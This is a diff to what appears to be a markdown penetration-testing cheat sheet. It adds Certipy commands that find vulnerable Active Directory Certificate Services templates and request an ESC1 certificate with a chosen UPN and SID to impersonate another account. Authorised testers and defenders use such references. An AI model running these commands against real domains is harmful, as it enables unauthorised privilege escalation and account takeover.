@@ -816,10 +816,18 @@ u.objectid ENDS WITH "-548" RETURN q
 </details> 
 
 <details>
-  <summary> ESC1 </summary> 
+  <summary> Certipy find vulnerable certificates </summary> 
   
   ```shell
-  ----
+  certipy find -u <username> -p <password> -dc-ip <Domain_Controller_IP> -vulnerable -stdout
+  ```
+</details> 
+
+<details>
+  <summary> ESC1 </summary> 
+
+  ```shell
+  certipy req -u <username>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server>  -template <vulnerable_template> -upn <username>@<domain> -sid <user_SID>
   ```
 </details> 
 
